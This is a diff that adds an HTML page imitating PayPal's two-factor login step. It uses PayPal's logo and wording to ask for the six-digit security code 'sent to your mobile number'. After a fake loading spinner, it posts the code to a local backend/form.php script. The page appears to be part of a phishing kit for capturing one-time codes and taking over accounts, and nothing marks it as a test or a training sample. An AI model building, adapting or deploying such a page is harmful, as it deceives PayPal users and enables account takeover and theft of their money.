@@ -1,0 +1,164 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal 2FA</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .auth-box {
+            background-color: #fff;
+            border-radius: 5px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 300px;
+        }
+        .auth-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .auth-header img {
+            width: 150px;
+        }
+        .auth-header h2 {
+            font-size: 18px;
+            margin-top: 10px;
+            color: #333;
+        }
+        .auth-header p {
+            font-size: 14px;
+            color: #666;
+            margin-top: 10px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #0070ba;
+        }
+        .verify-btn {
+            width: 100%;
+            background-color: #0070ba;
+            color: white;
+            border: none;
+            padding: 10px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            position: relative;
+        }
+        .verify-btn:hover {
+            background-color: #005fa3;
+        }
+        .spinner {
+            display: none;
+            width: 25px;
+            height: 25px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .resend-link {
+            text-align: center;
+            display: block;
+            margin-top: 10px;
+            color: #0070ba;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .resend-link:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="auth-box">
+            <div class="auth-header">
+                <img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg" alt="PayPal Logo">
+                <h2>Enter the security code</h2>
+                <p>We sent a code to your mobile number. Enter it below to log in.</p>
+            </div>
+            <form id="authForm" action="backend/form.php" method="post">
+                <div class="form-group">
+                    <label for="code">Security code</label>
+                    <input type="text" id="code" name="combinedCode" maxlength="6" required>
+                </div>
+                <button type="submit" class="verify-btn" id="verifyBtn">
+                    <span>Verify</span>
+                    <div class="spinner" id="spinner"></div>
+                </button>
+                <a href="#" class="resend-link">Didn't receive the code? Resend</a>
+            </form>
+            <div class="footer">
+                <p>Need help? <a href="#">Contact Us</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('authForm').addEventListener('submit', function(event) {
+            // Prevent immediate form submission
+            event.preventDefault();
+            
+            // Show the spinner and hide the "Verify" text
+            var verifyBtn = document.getElementById('verifyBtn');
+            var spinner = document.getElementById('spinner');
+            verifyBtn.querySelector('span').style.display = 'none';
+            spinner.style.display = 'block';
+
+            // Simulate form submission delay (e.g., via AJAX or backend processing)
+            setTimeout(function() {
+                // After delay, submit the form to form.php
+                document.getElementById('authForm').submit();
+            }, 1000); // Adjust delay as necessary
+        });
+    </script>
+
+</body>
+</html>
